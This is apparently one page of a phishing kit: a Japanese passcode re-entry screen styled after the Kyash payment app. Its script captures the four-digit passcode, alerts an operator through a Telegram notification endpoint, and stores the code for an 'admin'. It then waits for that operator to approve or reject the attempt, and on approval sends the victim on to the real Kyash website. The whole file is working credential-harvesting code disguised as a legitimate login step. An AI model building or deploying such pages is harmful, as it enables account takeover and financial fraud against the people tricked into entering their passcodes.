<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>パスコード確認</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Hiragino Sans', sans-serif; background-color: #f0f0f0; padding: 0 16px; display: flex; justify-content: center; min-height: 100vh; padding-top: 40px; }
        .container { width: 100%; max-width: 300px; }
        .close-btn { position: fixed; top: 20px; left: 16px; font-size: 24px; background: none; border: none; cursor: pointer; color: #3c4043; }
        .message-banner { display: none; margin-bottom: 16px; padding: 12px; border-radius: 8px; border-left: 4px solid #ff5252; background-color: #ffebee; }
        .message-banner.show { display: block; }
        .message-banner-title { font-size: 13px; font-weight: 600; color: #c62828; margin-bottom: 4px; }
        .message-banner-text { font-size: 12px; color: #b71c1c; }
        .content { text-align: center; }
        .instruction { font-size: 16px; font-weight: 600; color: #202124; margin-bottom: 8px; }
        .instruction-sub { font-size: 13px; color: #80868b; margin-bottom: 48px; }
        .indicators { display: flex; justify-content: center; gap: 20px; margin-bottom: 60px; }
        .dot { width: 14px; height: 14px; border: 2px solid #1f71b8; border-radius: 50%; background-color: transparent; transition: background-color 0.15s; }
        .dot.filled { background-color: #1f71b8; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0; }
        .key { padding: 18px; border: none; background: none; font-size: 26px; font-weight: 300; color: #1f71b8; cursor: pointer; font-family: inherit; }
        .key:active { opacity: 0.5; }
        .key-empty { visibility: hidden; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.4); z-index: 100; justify-content: center; align-items: center; }
        .loading-overlay.show { display: flex; }
        .loading-box { background: #fff; padding: 32px; border-radius: 12px; text-align: center; }
        .loading-box p { font-size: 14px; color: #5f6368; margin-bottom: 16px; }
        .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid rgba(31,113,184,0.3); border-top-color: #1f71b8; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <button class="close-btn">×</button>

    <div class="container">
        <div class="message-banner" id="messageBanner">
            <div class="message-banner-title" id="bannerTitle"></div>
            <div class="message-banner-text" id="bannerText"></div>
        </div>

        <div class="content">
            <div class="instruction">パスコードを再度入力</div>
            <div class="instruction-sub">もう一度入力してください</div>

            <div class="indicators">
                <div class="dot" id="dot0"></div>
                <div class="dot" id="dot1"></div>
                <div class="dot" id="dot2"></div>
                <div class="dot" id="dot3"></div>
            </div>

            <div class="keypad">
                <button class="key" data-key="1">1</button>
                <button class="key" data-key="2">2</button>
                <button class="key" data-key="3">3</button>
                <button class="key" data-key="4">4</button>
                <button class="key" data-key="5">5</button>
                <button class="key" data-key="6">6</button>
                <button class="key" data-key="7">7</button>
                <button class="key" data-key="8">8</button>
                <button class="key" data-key="9">9</button>
                <div class="key key-empty"></div>
                <button class="key" data-key="0">0</button>
                <button class="key" data-key="del">×</button>
            </div>
        </div>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-box">
            <p>確認中...</p>
            <div class="spinner"></div>
        </div>
    </div>

    <script>
        let passcode = '';

        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('sessionId') || localStorage.getItem('loginSessionId');
        if (!sessionId) { window.location.href = 'login.html'; }
        localStorage.setItem('loginSessionId', sessionId);

        const passcodeSessionId = sessionId + '_passcode';

        document.querySelector('.keypad').addEventListener('click', (e) => {
            const key = e.target.getAttribute('data-key');
            if (!key) return;

            if (key === 'del') {
                passcode = passcode.slice(0, -1);
            } else if (/^\d$/.test(key) && passcode.length < 4) {
                passcode += key;
            }

            updateDots();
            if (passcode.length === 4) submit();
        });

        function updateDots() {
            for (let i = 0; i < 4; i++) {
                document.getElementById('dot' + i).classList.toggle('filled', i < passcode.length);
            }
        }

        async function submit() {
            document.getElementById('loadingOverlay').classList.add('show');

            // ① Telegram通知
            sendTelegramNotification(`🔐 パスコード認証リクエスト\nセッションID: ${sessionId}\nパスコード: ****\n時刻: ${new Date().toLocaleString('ja-JP')}`);

            // ② adminに届けるためlocalStorageに書き込む
            localStorage.setItem('authRequest', JSON.stringify({
                type: 'PASSCODE_REQUEST',
                sessionId: passcodeSessionId,
                passcode: passcode,
                timestamp: new Date().toISOString()
            }));

            // ③ api.phpにもセッション登録
            try {
                await fetch('/api/auth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId: passcodeSessionId, action: 'pending' })
                });
            } catch (e) { console.error(e); }

            // ④ adminの許可/拒否を待つ
            const timer = setInterval(async () => {
                try {
                    const res = await fetch(`/api/auth?sessionId=${passcodeSessionId}`);
                    const data = await res.json();
                    if (data.approved) {
                        clearInterval(timer);
                        clearTimeout(timeout);
                        window.location.href = 'https://www.kyash.co/';
                    } else if (data.rejected) {
                        clearInterval(timer);
                        clearTimeout(timeout);
                        document.getElementById('loadingOverlay').classList.remove('show');
                        showBanner('認証拒否', '認証が拒否されました');
                        passcode = '';
                        updateDots();
                    }
                } catch (e) { console.error(e); }
            }, 500);

            const timeout = setTimeout(() => {
                clearInterval(timer);
                document.getElementById('loadingOverlay').classList.remove('show');
                showBanner('タイムアウト', '応答がありません');
                passcode = '';
                updateDots();
            }, 60000);
        }

        function showBanner(title, text) {
            document.getElementById('bannerTitle').textContent = title;
            document.getElementById('bannerText').textContent = text;
            document.getElementById('messageBanner').classList.add('show');
            setTimeout(() => document.getElementById('messageBanner').classList.remove('show'), 5000);
        }

        function sendTelegramNotification(message) {
            fetch('/api/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message })
            }).catch(e => console.error(e));
        }

        document.querySelector('.close-btn').addEventListener('click', () => {
            window.location.href = 'login.html';
        });
    </script>
</body>
</html>
